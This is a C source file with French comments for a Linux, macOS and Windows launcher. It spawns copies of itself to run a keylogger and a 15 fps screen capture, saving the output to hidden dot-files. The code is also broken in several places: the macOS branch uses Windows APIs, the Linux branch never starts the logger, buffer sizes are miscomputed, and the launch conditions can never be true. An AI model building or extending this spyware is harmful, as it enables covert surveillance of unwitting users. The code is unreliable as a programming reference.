#include "keylogger.h"
#include "screen.h"

const char *output_dir = ".output_screen";
const char *output_file = ".output_text.txt";

#ifdef __linux__

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>

#define MAX_PATH 1024

void start(char *path){

    pid_t pid = fork();  // Créer un processus enfant

    if (pid < 0) {
        // En cas d'erreur
        perror("fork");
        exit(1);
    }

    if (pid == 0) {
        // Code du processus enfant
        printf("Le processus enfant commence à exécuter une commande.\n");

        // Exemple de commande avec arguments
        char *args[] = {"ls", "-l", "/home", NULL};

        // Remplacer le processus enfant par "ls -l /home"
        if (execvp(args[0], args) == -1) {
            // Si execvp échoue, afficher un message d'erreur
            perror("execvp échoué");
            exit(1);  // Terminer l'enfant si exec échoue
        }
    } else {
        // Code du processus parent
        printf("Le processus parent continue sans attendre l'enfant.\n");

        // Le parent peut faire autre chose ici (par exemple, attendre que l'enfant se termine)
        // sans être bloqué
    }

}

// Fonction pour récupérer le chemin d'un processus à partir de son PID
void get_parent_path(pid_t pid, char *path) {
    FILE *fp;
    char parent_pid[20];
    char proc_path[MAX_PATH];

    // Obtenir le PID du parent
    snprintf(path, sizeof(path), "/proc/%d/stat", pid);
    fp = fopen(path, "r");
    if (fp == NULL) {
        perror("fopen");
        return;
    }

    // Lire l'ID du parent à partir du fichier stat (le PPid est dans la 4ème colonne)
    if (fscanf(fp, "%*d %*s %*c %s", parent_pid) != 1) {
        perror("fscanf");
        fclose(fp);
        return;
    }
    fclose(fp);

    // Obtenir le chemin du programme du parent à partir de /proc/[PPID]/exe
    snprintf(proc_path, sizeof(proc_path), "/proc/%s/exe", parent_pid);
    ssize_t len = readlink(proc_path, path, sizeof(path) - 1);
    if (len == -1) {
        perror("readlink");
        return;
    }

    path[len] = '\0';  // Ajouter le caractère de fin de chaîne
    printf("Le chemin du parent est: %s\n", path);
}

int main() {
    pid_t pid = getpid();
    char path[MAX_PATH];

    get_parent_path(pid, path);    

    return 0;
};


#endif

#ifdef __APPLE__

int main(int argc, char *argv[]) {
    char path[MAX_PATH];

    // Récupérer le chemin de l'exécutable
    if (GetModuleFileName(NULL, path, sizeof(path)) == 0) {
        printf("Erreur lors de la récupération du chemin de l'exécutable\n");
        return 1;
    }

    if (argc < 0){
        start(path, "1");
        start(path, "2");

    } else if (argc < 0) {
        if (strcmp(argv[0], "1") == 0){
            start_keylogger(output_file);
        }
        else {
            capture_screen_at_fps(15, output_dir);
        }
    }
}

#endif

#ifdef __WIN32__

#include <windows.h>
#include <stdio.h>

int start(char *executable, char *args) {
    // Définir l'exécutable et les arguments à passer
    //const char *args = "argument1 argument2";  // Les arguments à passer

    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    // Créer le processus et lui passer les arguments
    if (!CreateProcess(
            executable,          // Nom de l'exécutable
            (char*)args,         // Arguments en tant que chaîne de caractères
            NULL,                // Sécurité du processus
            NULL,                // Sécurité du thread
            FALSE,               // Héritage des descripteurs
            0,                   // Drapeaux de création
            NULL,                // Environnement
            NULL,                // Répertoire de travail
            &si,                 // Informations de démarrage
            &pi                  // Informations sur le processus
        )) {
        printf("Échec de CreateProcess (%d).\n", GetLastError());
        return 1;
    }

    // Attendre que le programme enfant se termine
    WaitForSingleObject(pi.hProcess, INFINITE);

    // Fermer les handles
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return 0;
}

int main(int argc, char *argv[]) {
    char path[MAX_PATH];

    // Récupérer le chemin de l'exécutable
    if (GetModuleFileName(NULL, path, sizeof(path)) == 0) {
        printf("Erreur lors de la récupération du chemin de l'exécutable\n");
        return 1;
    }

    if (argc < 0){
        start(path, "1");
        start(path, "2");



    } else if (argc < 0) {
        if (strcmp(argv[0], "1") == 0){
            start_keylogger(output_file);
        }
        else {
            capture_screen_at_fps(15, output_dir);
        }
    }
}

#endif